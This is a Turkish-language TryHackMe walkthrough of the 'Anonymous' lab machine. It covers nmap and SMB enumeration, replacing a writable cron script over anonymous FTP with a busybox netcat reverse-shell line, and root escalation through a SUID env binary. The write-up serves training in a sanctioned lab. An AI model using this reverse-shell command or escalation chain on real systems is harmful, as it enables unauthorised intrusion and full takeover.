---
title: 'TryHackMe | Anonymous WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [ftp, suid]
render_with_liquid: false
---

## Özet

Anonymous, `FTP` üzerinden sisteme shell yükleyerek sisteme giriş yaptığımız orta seviye bir linux makinedir. Bağlantı sonrasında `SUID` bitine sahip olan dosyaları listeyecek ve listede bulunan bir dosyadan faydalanarak yetki yükselteceğiz.

## Keşif aşaması

### Nmap taraması

```console
$nmap -sV -sC -T4 10.10.84.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-23 07:19 EDT
Nmap scan report for 10.10.84.107
Host is up (0.063s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.21.66.61
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-03-23T11:20:06+00:00
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-23T11:20:06
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
```

Tarama sonucunda 21 (FTP), 22 (SSH) ve 139/445 (SMB) numaralı portların açık olduğunu öğreniyoruz. Ayrıca `FTP` servisinin `anonymous` özelliği, SMB servisinin ise misafir kullanıcı özelliği aktif bulunuyor.

### 139/445 numaralı portlarının incelenmesi

SMBMap aracını kullanarak misafir oturumunda görüntüleyebildiğimiz dosyaları listelediğimizde pics adında bir paylaşım olduğunu görüyoruz. 

```console
$ smbmap -H 10.10.84.107 -r
[+] Guest session       IP: 10.10.84.107:445    Name: 10.10.84.107                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        pics                                                    READ ONLY       My SMB Share Directory for Pics
        .\pics\*
        dr--r--r--                0 Sun May 17 07:11:34 2020    .
        dr--r--r--                0 Wed May 13 21:59:10 2020    ..
        fr--r--r--            42663 Mon May 11 20:43:42 2020    corgo2.jpg
        fr--r--r--           265188 Mon May 11 20:43:42 2020    puppos.jpeg
        IPC$                                                    NO ACCESS       IPC Service (anonymous server (Samba, Ubuntu))
```

Bu dosyanın içerisinde `corgo2.jpg` ve `puppos.jpeg` olmak üzere iki dosya bulunuyor. İkisindende herhangi bir bilgi çıkaramadım.

```console
$smbclient \\\\10.10.84.107\\pics
Password for [WORKGROUP\appdone]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13306816 blocks available
smb: \> get corgo2.jpg 
getting file \corgo2.jpg of size 42663 as corgo2.jpg (90.4 KiloBytes/sec) (average 90.4 KiloBytes/sec)
smb: \> get puppos.jpeg 
getting file \puppos.jpeg of size 265188 as puppos.jpeg (384.8 KiloBytes/sec) (average 265.1 KiloBytes/sec)
smb: \> 
```

### 21 numaralı portun incelenmesi

FTP servisine misafir kullanıcı olarak bağlandıktan sonra `clean.sh`, `removed_files.log` ve `to_do.txt` olmak üzere üç dosya ile karşılaşıyoruz.

```console
ftp> ls -la
229 Entering Extended Passive Mode (|||15032|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1720 Mar 23 11:36 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> 
```

`to_do.txt` dosyası içerisinde, misafir kullanıcı özelliğinin güvenli olmadığı ve kapatılması gerektiği yazıyor.

```
I really need to disable the anonymous login...it's really not safe
```

`clean.sh` dosyasının içerisinde ise  `Running cleanup script:  nothing to delete` yazısını `removed_files.log` dosyasına ekleyen bir `bash` kodu var.

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

`removed_files.log` dosyasını kontrol ettiğimizde `clean.sh` dosyasının defalarca çalıştırıldığınnı ve bu dosyaya yazdırıldığını görüyoruz.

```console
$ cat removed_files.log                                                                                                                                                                   
Running cleanup script:  nothing to delete                                                                                                                                                    
Running cleanup script:  nothing to delete                                                                                                                                                    
Running cleanup script:  nothing to delete
...
```

## Sömürü aşaması

`removed_files.log` dosyasından yola çıkarak `clean.sh` dosyasının ara ara çalıştırıldığını düşünebiliriz. Reverse shell kodumuzu aynı isimde bir dosyaya ekleeyelim.

```console
$ echo "busybox nc 10.21.66.61 1234 -e /bin/bash" > clean.sh
```

Daha sonra bu dosyayı `FTP` servisinde bulunan `scripts` dizinine yükledikten sonra bağlantının geleceği portu dinlemeye alalım.

```console
ftp> put clean.sh 
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||37654|)
150 Ok to send data.
100% |*************************************************************************************************************************************************|    41        1.14 MiB/s    00:00 ETA
226 Transfer complete.
41 bytes sent in 00:00 (0.30 KiB/s)
```

Yaklaşık 15-20 saniye sonra dinlemeye aldığımız port üzerinden bağlantıyı elde ediyoruz.

```console
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.21.66.61] from (UNKNOWN) [10.10.84.107] 42498
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

## Yetki yükseltme

### root

`SUID` bitine sahip olan dosyaları listelediğimizde içlerinden biri olan `/usr/bin/env` dosyası ilgimizi çekiyor.

```console
 namelessone@anonymous:/$ find / -perm -4000 2>/dev/null
...
/usr/bin/env
...
```

Bu dosyayı [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid) sitesinde arattıktan sonra sadece `/usr/bin/bash -p` komutunu ekleyerek yetki yükseltebileceğimizi öğreniyoruz. Bunu uyguladıktan sonra root haklarına sahip oluyor ve `/root` diziniden son bayrağımızı alıyoruz.

```console
namelessone@anonymous:/$ /usr/bin/env /bin/bash -p
bash-4.4# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root)...
bash-4.4# cd /root
bash-4.4# ls
root.txt
```
